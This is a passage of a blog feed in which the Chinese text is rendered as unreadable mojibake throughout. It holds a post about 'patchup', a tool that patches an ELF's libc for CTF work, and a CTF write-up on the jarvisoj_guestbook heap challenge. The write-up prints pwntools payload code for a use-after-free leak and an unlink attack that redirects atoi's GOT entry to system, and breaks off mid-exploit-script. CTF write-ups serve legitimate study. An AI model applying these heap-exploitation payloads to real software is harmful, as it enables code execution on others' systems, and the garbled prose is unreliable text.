        <content type="html"><![CDATA[<h1 id="patchup"><a href="#patchup" class="headerlink" title="patchup"></a>patchup</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¯¥å·¥å…·æ˜¯æˆ‘è‡ªç”¨çš„ä¸€ä¸ªå°å·¥å…·ï¼ˆé’ˆå¯¹äºåšpwné¢˜çš„è¾…åŠ©å·¥å…·ï¼‰ï¼ˆæœ¬å·¥å…·çš„å®ç°éå¸¸ç®€å•ï¼Œè€Œä¸”è¿™ä¸ªå·¥å…·çš„æ ¸å¿ƒæ˜¯ä¾èµ–patchelfå’Œglibc-all-in-oneè¿™ä¸¤ä¸ªå·¥å…·ï¼‰ï¼Œç”¨äºå¿«é€Ÿä¿®æ”¹æœ¬åœ°<code>ELF</code>æ–‡ä»¶çš„libcä½¿å…¶ä¸è¿œç¨‹æœåŠ¡å™¨é‚£è¾¹æ‰€è¿è¡Œçš„ç¨‹åºä¾èµ–çš„<code>libc</code>åº“ä¸€æ ·<br>ä»è€Œé¿å…äº†å› ä¸º <code>libc</code> é—®é¢˜ï¼Œè€Œå¯¼è‡´æœ¬åœ°æ‰“é€šäº†ä½†æ˜¯è¿œç¨‹æ²¡æ‰“é€šçš„å°´å°¬æƒ…å†µã€‚å› ä¸ºæ¯æ¬¡éƒ½æ‰‹åŠ¨ <code>patch libc</code> çš„è¿‡ç¨‹å¤ªè¿‡äºé‡å¤ï¼Œè€Œä¸”æœ‰æ¦‚ç‡å‡ºé”™ï¼ŒåŒæ—¶å—åˆ°äº†<br><code>roderick</code> å¸ˆå‚…å†™çš„ <code>pwncli</code> çš„å¯å‘ï¼Œäºæ˜¯å°±æœ‰è‡ªå·±å†™ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·çš„æƒ³æ³•ã€‚<br>å¦‚æœä½ æƒ³çœ‹æ–½å·¥ç°åœºï¼Œè¯·è§ <a href="https://github.com/ZIKH26/patchup">githubä»“åº“</a></p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>ç”±äºè¿™ä¸ªå°å·¥å…·ä¾èµ–çš„æ ¸å¿ƒä¾ç„¶æ˜¯ <code>patchelf</code> å’Œ <code>glibc-all-in-one</code> ï¼Œèƒ½è®©å®ƒä»¥å‘½ä»¤è¡Œå·¥å…·çš„èº«ä»½å‡ºç°ï¼Œè¿˜å°‘ä¸äº†pythonä¸­çš„ <code>click</code> æ¨¡å—ã€‚<br>å› æ­¤ä½ åº”è¯¥æœ‰å¦‚ä¸‹ä¸œè¥¿ <code>patchelf</code>   <code>glibc-all-in-one</code> ï¼Œå¦‚æœæœ‰çš„è¯è¯·ç›´æ¥çœ‹ä¸‹é¢çš„ <a href="#install-patchup">install patchup</a> éƒ¨åˆ†ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ä¸‹æ–‡å°±æ˜¯ç›¸å…³éƒ¨ç½²ã€‚</p><h3 id="install-patchelf"><a href="#install-patchelf" class="headerlink" title="install patchelf"></a>install patchelf</h3><h4 id="ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶"></a>ç›´æ¥ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NixOS/patchelf/releases/download/0.14.5/patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line">tar -xzvf patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">sudo <span class="built_in">mv</span> patchelf /bin/patchelf</span><br></pre></td></tr></table></figure><h4 id="æ‰‹åŠ¨ç¼–è¯‘-patchelf"><a href="#æ‰‹åŠ¨ç¼–è¯‘-patchelf" class="headerlink" title="æ‰‹åŠ¨ç¼–è¯‘ patchelf"></a>æ‰‹åŠ¨ç¼–è¯‘ patchelf</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line"><span class="comment"># å®‰è£…autoreconf</span></span><br><span class="line">sudo apt install -y autoconf</span><br><span class="line"><span class="comment"># èµ‹äºˆæ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="built_in">chmod</span> +x bootstrap.sh</span><br><span class="line"><span class="comment"># ä½¿ç”¨é¢„è®¾è„šæœ¬é…ç½®ç¼–è¯‘ç¯å¢ƒ</span></span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="install-glibc-all-in-one"><a href="#install-glibc-all-in-one" class="headerlink" title="install glibc-all-in-one"></a>install glibc-all-in-one</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one</span><br><span class="line"><span class="built_in">mkdir</span> libs</span><br><span class="line"><span class="built_in">chmod</span> +x  extract  update_list download</span><br><span class="line">./update_list</span><br></pre></td></tr></table></figure><p>cd åˆ°ä¸Šçº§ç›®å½•</p><h2 id="install-patchup"><a href="#install-patchup" class="headerlink" title="install patchup"></a>install patchup</h2><p>okï¼Œå‡è®¾ä½ ç°åœ¨æœ‰äº† <code>patchelf</code> å’Œ <code>glibc-all-in-one</code>  é‚£ä¹ˆä½ å°±å¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£… <code>patchup</code> è¿™ä¸ªå°å·¥å…·äº† </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/polishing-labs/patchup.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchup</span><br><span class="line"></span><br><span class="line">sudo pip install --editable .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥è¾“å…¥patchup â€“helpå‘½ä»¤æŸ¥çœ‹å¸®åŠ©ï¼Œå¦‚æœå‡ºç°ä¸‹é¢å›¾ç‰‡æ‰€å±•ç¤ºçš„å†…å®¹ï¼Œåˆ™è¯´æ˜å®‰è£…æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><img width="544" alt="image" src="https://user-images.githubusercontent.com/93199623/168457093-d3019f95-8ec7-4dd1-bea6-ea7222e77533.png"><p>æœ€åç›®å½•ç»“æ„åº”è¯¥å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glibc-all-in-oneï¼ˆç›®å½•ï¼‰</span><br><span class="line">patchelfï¼ˆç›®å½•ï¼‰</span><br><span class="line">patchup</span><br><span class="line">â”œâ”€â”€ patchup.py(ä»“åº“æ–‡ä»¶)</span><br><span class="line">â””â”€â”€ setup.py(ä»“åº“æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>å‡è®¾ä½ æœ‰ä¸€ä¸ª åä¸º <code>demo</code>  ELF æ–‡ä»¶,ä»–ç°åœ¨é»˜è®¤çš„ <code>libc</code> åº“æ˜¯ <code>2.27</code> çš„ï¼Œä½†æ˜¯æœåŠ¡å™¨é‚£è¾¹çš„è¿™ä¸ªç¨‹åºæ‰€ä¾èµ–çš„ <code>libc</code> åº“æ˜¯2.23çš„<br>é‚£ä¹ˆä½ å°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œå»ä¸ºä½ çš„ELFæ–‡ä»¶patchä¸€ä¸ª <code>2.23</code> çš„ <code>libc</code> åº“ã€‚ï¼ˆ<code>-b</code> æ˜¯å¤‡ä»½çš„æ„æ€ï¼Œå»ºè®®æ¯æ¬¡ä½¿ç”¨ <code>patchup</code> æ—¶éƒ½å¼€å¯è¯¥é€‰é¡¹,<code>-c</code>æ˜¯è‡ªä¸»é€‰æ‹©å°ç‰ˆæœ¬libcçš„é€‰é¡¹ï¼Œå¼€å¯è¿™ä¸ªé€‰é¡¹ä½ å¯ä»¥é€‰æ‹©å°ç‰ˆæœ¬ä¸åŒçš„<code>2.23</code>çš„<code>libc</code>åº“ï¼Œå¦‚æœä¸å¼€å¯ï¼Œåˆ™é»˜è®¤æ˜¯åŒ¹é…åˆ°2.23ç‰ˆæœ¬çš„ç¬¬ä¸€ä¸ª<code>libc</code>åº“ï¼‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup demo 2.23 -b</span><br></pre></td></tr></table></figure><img width="965" alt="image" src="https://user-images.githubusercontent.com/93199623/167239931-d6266ea8-5ee6-4dde-9037-a20ae9e73069.png"><h3 id="glibc-all-in-oneä¸­æ²¡æœ‰æ‰€éœ€è¦çš„libc"><a href="#glibc-all-in-oneä¸­æ²¡æœ‰æ‰€éœ€è¦çš„libc" class="headerlink" title="glibc-all-in-oneä¸­æ²¡æœ‰æ‰€éœ€è¦çš„libc"></a>glibc-all-in-oneä¸­æ²¡æœ‰æ‰€éœ€è¦çš„libc</h3><p>å‡è®¾ä½ çš„ <code>glibc-all-in-one</code> ä¸­ç©ºç©ºå¦‚ä¹Ÿï¼ˆæ²¡æœ‰æ‰€éœ€è¦çš„libcç‰ˆæœ¬ï¼‰ï¼Œåˆ«æ‹…å¿ƒï¼Œä½ ä¾æ—§å¯ä»¥è¾“å…¥ä¸Šé¢çš„å‘½ä»¤ã€‚<code>patchup</code> å°†ä¼šä¸ºä½ è‡ªåŠ¨ä¸‹è½½ï¼ˆå¦‚æœä½ éœ€è¦çš„è¯ï¼‰æ•ˆæœå¦‚ä¸‹ï¼š<br><img width="1149" alt="image" src="https://user-images.githubusercontent.com/93199623/167242074-a6b3d411-af5d-4444-b9f4-acec16667e94.png"></p><p>æ­¤æ—¶ <code>match_libc_success_match</code> å±•ç¤ºäº†å½“å‰å¯ä»¥ä¸‹è½½çš„libcç‰ˆæœ¬ï¼Œä½ å¯ä»¥è¾“å…¥ä¸‹é¢ç´¢å¼•æ¥é€‰æ‹©å®ƒä»¬ï¼ˆç¬¬ä¸€ä¸ªç´¢å¼•æ˜¯0ï¼Œç¬¬äºŒä¸ªç´¢å¼•æ˜¯1ï¼Œä»¥æ­¤ç±»æ¨ï¼‰<br><img width="1145" alt="image" src="https://user-images.githubusercontent.com/93199623/167242133-464207ad-6416-4cc1-859f-32ebca40ff7b.png"><br>ç­‰å¾…ä¸‹è½½æˆåŠŸåï¼Œå°†è‡ªåŠ¨è¿›è¡Œ <code>patch</code>ï¼ˆå¦‚æœä¸æƒ³ä¸‹è½½çš„è¯ï¼Œå¯ä»¥è¾“å…¥qé€€å‡ºï¼‰</p><h3 id="ä½¿ç”¨é¢˜ç›®æŒ‡å®šçš„libcåº“"><a href="#ä½¿ç”¨é¢˜ç›®æŒ‡å®šçš„libcåº“" class="headerlink" title="ä½¿ç”¨é¢˜ç›®æŒ‡å®šçš„libcåº“"></a>ä½¿ç”¨é¢˜ç›®æŒ‡å®šçš„libcåº“</h3><p>å¦‚æœé¢˜ç›®ç»™å®šäº†ä¸€ä¸ªlibcåº“ï¼Œåˆ«æ‹…å¿ƒ <code>patchup</code> ä¾æ—§ä¼šæ­£å¸¸å·¥ä½œï¼Œ<code>patchup</code> å°†ä¼šå»å¯»æ‰¾ç›¸åº”åŒ¹é…çš„ <code>ld</code>ï¼Œå¦‚æœæœ‰çš„è¯åˆ™ä¼šç›´æ¥é“¾æ¥ï¼Œ<br><img width="966" alt="image" src="https://user-images.githubusercontent.com/93199623/167242830-9cf871bb-e025-4c51-9fca-c3d78f462924.png"></p><p>æ²¡æœ‰çš„è¯åˆ™ä¼šè‡ªåŠ¨ä¸‹è½½ï¼ˆå¦‚æœä½ éœ€è¦çš„è¯ï¼‰ï¼Œå¦‚ä¸‹å›¾<br><img width="1150" alt="image" src="https://user-images.githubusercontent.com/93199623/167242865-c6a01d64-1c9f-415b-aa18-5428821d0a15.png"></p><p>å€¼å¾—ä¸€æçš„å°±æ˜¯ï¼Œæˆ‘ç¢°è§è¿‡ä½¿ç”¨<code>patchup</code>ä¹‹å<code>patch</code>æŒ‡å®š<code>libc</code>æ˜¯å¤±è´¥çš„ï¼Œä¸è¿‡æˆ‘æ£€æŸ¥äº†ä¸€ä¸‹å‘ç°è¿™å¹¶ä¸æ˜¯<code>patchup</code>çš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯<code>patchelf</code>å‡ºäº†ç‚¹<code>bug</code>ï¼Œæ‰€ä»¥ç¢°åˆ°è¿™ç§æƒ…å†µï¼Œå¯ä»¥æ¢æˆ<code>glibc-all-in-one</code>ä¸­ç‰ˆæœ¬ä¸€æ ·çš„<code>libc</code>åº“è¯•è¯•ã€‚</p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p>å°½ç®¡æœ¬å·¥å…·å¼‚å¸¸çš„ç®€å•ï¼Œä½†æ˜¯å¯¹äºæˆ‘è¿™ä¸ªä¸å¤ªèªæ˜çš„å¤§ä¸€å­¦ç”Ÿæ¥è¯´ï¼Œå†™çš„è¿‡ç¨‹ä¹Ÿå¹¶ä¸ä¸€å¸†é£é¡ºã€‚æ„Ÿè°¢ Roderick å¸ˆå‚…å¸¦ç»™æˆ‘çš„å¯å‘ä»¥åŠè§£ç­”ä¸€äº›æˆ‘çš„å›°æƒ‘ï¼Œä¹Ÿæ„Ÿè°¢æˆ‘çš„é˜Ÿå‘˜ <a href="www.timochan.cn">Timochan</a> , å¦‚æœæ²¡æœ‰ä»–ï¼Œå…³äºè¿™ä¸ªå·¥å…·åœ¨å…¶ä»–ä¸»æœºä¸Šçš„ä¸€äº›ç¯å¢ƒéƒ¨ç½²æˆ‘å¯èƒ½æ— æ³•å®ç°</p>]]></content>
      
      
      <categories>
          
          <category> å°è¯•å¼€å‘å°å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_guestbook</title>
      <link href="/posts/f118134e.html"/>
      <url>/posts/f118134e.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220901212333982-783105096.png"></p><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p>åœ¨deleteå‡½æ•°ä¸­ï¼Œfreeå‡½æ•°æ‰§è¡Œåï¼Œæœªå°†æŒ‡é’ˆç½®ç©ºå­˜åœ¨UAFæ¼æ´</p><p><img src="/../img/2706180-20220901212347246-2034102819.png"></p><p>åœ¨è¯»å…¥æ•°æ®çš„å‡½æ•°ä¸­ï¼Œæœªåœ¨å­—ç¬¦ä¸²çš„æœ«å°¾æ·»åŠ \x00ï¼Œæ¥æˆªæ–­å­—ç¬¦ä¸²ï¼Œå¯¼è‡´showå‡½æ•°ä¸­çš„%så¯èƒ½æ³„éœ²å‡ºæ›´å¤šçš„æ•°æ®</p><p><img src="/../img/2706180-20220901212400614-261058314.png"></p><p>ä¿æŠ¤ä¸ºPartial RELROï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¿®æ”¹gotè¡¨ã€‚</p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220901212442314-1247059414.png"></p><p>åœ¨ç¨‹åºçš„å¼€å§‹å°±åˆ›å»ºäº†ä¸€ä¸ªå¾ˆå¤§çš„å †å—ï¼Œç”¨äºä¹‹åå­˜æ”¾æˆ‘ä»¬åˆ›å»ºçš„å †å—çš„å„ç§ä¿¡æ¯ã€‚</p><p>è€Œæˆ‘ä»¬é€šå¸¸åšçš„å †é¢˜ï¼Œå †å—çš„ä¿¡æ¯(åŒ…æ‹¬å †å—çš„åœ°å€ï¼Œå †å—çš„å¤§å°ç­‰ç­‰)éƒ½è®°å½•åœ¨äº†bssæ®µï¼Œä½†æ˜¯è¿™é“é¢˜æœ‰ç‚¹ç‰¹æ®Šï¼Œè®°å½•åœ¨äº†æœ€å¼€å§‹åˆ›å»ºçš„ä¸€ä¸ªå¤§å †å—é‡Œã€‚</p><p>åœ¨deleteå‡½æ•°ä¸­è™½ç„¶å­˜åœ¨äº†uafï¼Œä½†æŠŠå­˜æ”¾å †å—å¤§å°å’Œæ ‡å¿—ä½éƒ½ç»™ç½®ç©ºäº†ï¼Œè€Œeditå‡½æ•°ä¸­åˆ™æ£€æŸ¥äº†æ ‡å¿—ä½ï¼Œå› æ­¤æ— æ³•ç›´æ¥é‡Šæ”¾æ‰å †å—å»å†™å…¥æ•°æ®ã€‚å¹¶ä¸”æˆ‘ä»¬ç”³è¯·çš„å †å—ä¼šè‡ªåŠ¨å’Œ0x80å¯¹é½ã€‚è¿™å°±æ„å‘³ç€æˆ‘ä»¬è¿™é“é¢˜æ— æ³•å°†å †å—é‡Šæ”¾åˆ°fastbinä¸­ã€‚</p><p>åœ¨editå‡½æ•°ä¸­è™½ç„¶å†æ¬¡é—®äº†æˆ‘ä»¬sizeï¼Œä½†æ˜¯å´ç”¨äº†reallocå‡½æ•°ï¼Œå› æ­¤è¿™é‡Œä¹Ÿæ— æ³•æº¢å‡ºã€‚</p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>è¿™é“é¢˜æˆ‘ä»¬åˆ©ç”¨çš„æ˜¯unlinkï¼Œè€Œè¿™ä¸ªé¢˜å’Œå¸¸è§„çš„unlinkæœ‰äº›ä¸ä¸€æ ·ï¼Œå¸¸è§„çš„unlinkä¸€èˆ¬æ˜¯ç»™ä¸ªæº¢å‡ºï¼Œç„¶åå»ç¯¡æ”¹bssæ®µå­˜æ”¾çš„å †å—ä¿¡æ¯ã€‚è€Œè¿™é“é¢˜ä¸å­˜åœ¨æº¢å‡ºï¼Œæ˜¯åˆ©ç”¨UAFï¼Œè¦†å†™ä¹‹å‰è¢«freeæ‰çš„å †å—çš„prev_sizeå’Œsizeä½æ¥è¾¾åˆ°unlinkçš„ã€‚</p><p>ä¸è¿‡åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆæ³„éœ²ä¸€ä¸‹åœ°å€ã€‚</p><h3 id="æ³„éœ²åœ°å€ï¼š"><a href="#æ³„éœ²åœ°å€ï¼š" class="headerlink" title="æ³„éœ²åœ°å€ï¼š"></a>æ³„éœ²åœ°å€ï¼š</h3><p>æˆ‘ä»¬å…ˆç”³è¯·å››ä¸ªå †å—ï¼Œåˆ†åˆ«ä¸ºchunk1,chunk2,chunk3,chunk4ã€‚æˆ‘ä»¬å°†chunk1å’Œchunk3é‡Šæ”¾æ‰ï¼Œå› ä¸ºé‡Šæ”¾æ‰åä¸€å®šä¼šè¿›å…¥unsorted binä¸­ï¼Œå¦‚æœä¸ç”¨å †å—éš”å¼€çš„è¯ï¼Œé‚£ä¹ˆåˆšé‡Šæ”¾æ‰çš„å †å—å°±ä¼šå’Œunsorted binä¸­çš„å †å—åˆå¹¶ã€‚åŒæ—¶è¿˜è¦é˜²æ­¢å’Œtop chunkåˆå¹¶ï¼Œå› æ­¤å†ç”³è¯·ä¸€ä¸ªchunk4ã€‚</p><p>æ­¤æ—¶çš„chunk1å’Œchunk3çš„æƒ…å†µå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220901220954399-696534232.png"></p><p>è€Œåœ¨showå‡½æ•°ä¸­ï¼Œå¯¹å †å—çš„æ ‡å¿—ä½è¿›è¡Œäº†æ£€æŸ¥ï¼Œå¦‚æœå †å—è¢«é‡Šæ”¾çš„è¯ï¼Œæ˜¯æ— æ³•æ‰“å°å‡ºæ¥é‡Œé¢çš„å†…å®¹çš„ã€‚ä½†å¦‚æœæˆ‘ä»¬å†å°†chunk1å’Œchunk3ç”³è¯·å‡ºæ¥å¹¶å†™å…¥å…«å­—èŠ‚çš„æ•°æ®çš„è¯ï¼Œæ­¤æ—¶çš„æ ‡å¿—ä½ä¸º1ï¼Œå¯ä»¥ç”¨showå‡½æ•°æ‰“å°å…¶ä¸­çš„æ•°æ®ï¼Œå› ä¸ºè¾“å…¥æ•°æ®æ—¶ï¼Œæ²¡æœ‰åŠ ä¸Š\x00æ¥æˆªæ–­å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥å°†ä½äºunsorted binä¸­bkæŒ‡é’ˆç»™æ³„éœ²å‡ºæ¥ã€‚(å¦‚ä¸‹)</p><p><img src="/../img/2706180-20220901221010360-996685723.png"></p><p>æ­¤æ—¶æˆ‘ä»¬çš„expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†å †åœ°å€å’Œlibcåœ°å€ã€‚ä¹Ÿå°±æ˜¯ä½¿ç”¨unlinkæ—¶ï¼Œé‚£ä¸ªptræˆ‘ä»¬å·²ç»æœ‰äº†ã€‚å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦ä¼ªé€ å †å—çš„prev_sizeå’Œsizeã€‚</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªfake chunkã€‚å…¶sizeä¸º0x81 prev_sizeä¸º0ï¼Œç„¶åæ„é€ ä¸€ä¸ªptr-0x18å’Œptr-0x10ã€‚pträ¸º&amp;chunk1çš„åœ°å€ã€‚æ¥ä¸‹æ¥å¡«å……åƒåœ¾å­—ç¬¦ï¼Œç›´åˆ°åŸæœ¬ä¹‹å‰chunk2çš„ä½ç½®ï¼Œç„¶åè¦†ç›–å·²ç»è¢«é‡Šæ”¾æ‰çš„chunk2çš„prev_sizeä¸º0x80(éœ€è¦å’Œfake chunkçš„sizeä¸€æ ·)ï¼Œè€Œsizeè¦ä¸º0x90(å› ä¸ºè‡³å°‘è¦ä¸º0x90å¤§äºfastbinçš„èŒƒå›´ï¼Œå¦åˆ™æ— æ³•åˆå¹¶ï¼Œè€Œæœ¬é¢˜åˆåªèƒ½ç”³è¯·è·Ÿ0x80å¯¹é½çš„sizeï¼Œå› æ­¤æœ€å°æ»¡è¶³æ¡ä»¶çš„sizeå°±æ˜¯0x90)ã€‚å¦‚æœæ˜¯å¯»å¸¸unlinkçš„è¯ï¼Œåˆ°è¿™é‡Œå°±okäº†ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æº¢å‡ºä¿®æ”¹çš„sizeï¼Œåªè¦<strong>ä¸ç ´ååŸæœ¬çš„å †å—å¸ƒå±€(å°±æ˜¯è¦ç¡®ä¿æ ¹æ®æˆ‘ä»¬ç¯¡æ”¹çš„sizeè¿˜èƒ½å¤Ÿæ­£å¸¸çš„æ‰¾åˆ°top chunk)<strong>ï¼Œå°±å¥½äº†ã€‚ä½†æ˜¯è¿™é“é¢˜æˆ‘ä»¬å¹¶ä¸æ˜¯æº¢å‡ºï¼Œè€Œä¸”æ²¡æœ‰åšä¸€ä¸ªé˜²æ­¢åˆå¹¶çš„å †å—,å¦‚æœå°±è¿™æ ·å†™å®Œçš„è¯ï¼Œé‡Šæ”¾æ‰å¼•çº¿å †å—ï¼Œå®ƒä¼šå’Œtop chunkåˆå¹¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†å†™å…¥ä¸€å®šçš„åƒåœ¾æ•°æ®ï¼Œç„¶åå†å¸ƒç½®ä¸€ä¸ªchunkå¤´ï¼Œè¿™ä¸ªchunkå¤´çš„ç›®çš„å°±æ˜¯å»åšä¸€ä¸ªé˜²æ­¢å’Œtop chunkåˆå¹¶çš„å †å—ã€‚</strong>è€Œè¿™ä¸ªchunkå¤´çš„sizeä¸èƒ½ä¹±å†™ï¼Œå¿…é¡»è¦ä¿è¯èƒ½æ ¹æ®è¿™ä¸ªsizeæ‰¾åˆ°top chunkçš„åœ°å€ã€‚</strong></p><p>å› æ­¤è¿™é‡Œçš„å¸ƒå±€åçš„payloadåº”è¯¥å¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)<span class="comment">#å…ˆå°†è¿™å››ä¸ªå †å—å…¨éƒ¨é‡Šæ”¾ï¼Œä¸ºä¹‹åè¦†å†™å †å—ä¸­çš„sizeå’Œprev_sizeåšå‡†å¤‡</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å †å—çš„å¸ƒå±€å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220901221028228-242800843.png"></p><p>åˆ‡è®°ï¼Œé˜²æ­¢åˆå¹¶å †å—çš„sizeä¹Ÿå¾ˆé‡è¦ï¼Œå¿…é¡»è¦è®©å †å—çš„åœ°å€åŠ ä¸Šsizeä¸ºtop chunkçš„åœ°å€ã€‚</p><p>ç„¶åæˆ‘ä»¬å†æ¬¡é‡Šæ”¾å¼•çº¿å †å—(å› ä¸ºè¿™ä¸ªå †å—å·²ç»è¢«é‡Šæ”¾è¿‡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†é‡Šæ”¾ä¸€æ¬¡)ï¼Œè§¦å‘unlinkåˆå¹¶ã€‚&amp;fake-0x18è¿™ä¸ªåœ°å€è¢«å†™å…¥å¤§å †å—ä¸­ã€‚</p><p>unlinkåçš„å¤§å †å—ä¸­çš„æ•°æ®å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220901221041013-1426029960.png"></p><p>æ­¤æ—¶å†ç¼–è¾‘chunk0å°±å¯ä»¥ä¿®æ”¹å¤§å †å—ä¸­å­˜æ”¾çš„chunkåœ°å€äº†ï¼Œæˆ‘ä»¬ä¿®æ”¹atoiçš„gotè¡¨ï¼Œå†™å…¥systemå‡½æ•°åœ°å€å³å¯ã€‚</p><p>æœ€åä¸€ç‚¹éœ€è¦æ³¨æ„çš„å°±æ˜¯ï¼Œeditå‡½æ•°å†™å…¥atoiçš„gotè¡¨æ—¶ï¼Œ<strong>é¡ºä¾¿ç¯¡æ”¹ä¸€ä¸‹å †å—å¤§å°ä¸ºå…«å­—èŠ‚ï¼Œä¸ç„¶çš„è¯å†å†™å…¥0x120çš„æ•°æ®ä¼šç¯¡æ”¹æ‰å…¶ä»–å‡½æ•°çš„gotè¡¨å¯¼è‡´ç¨‹åºå´©æºƒ</strong>ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26866&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span 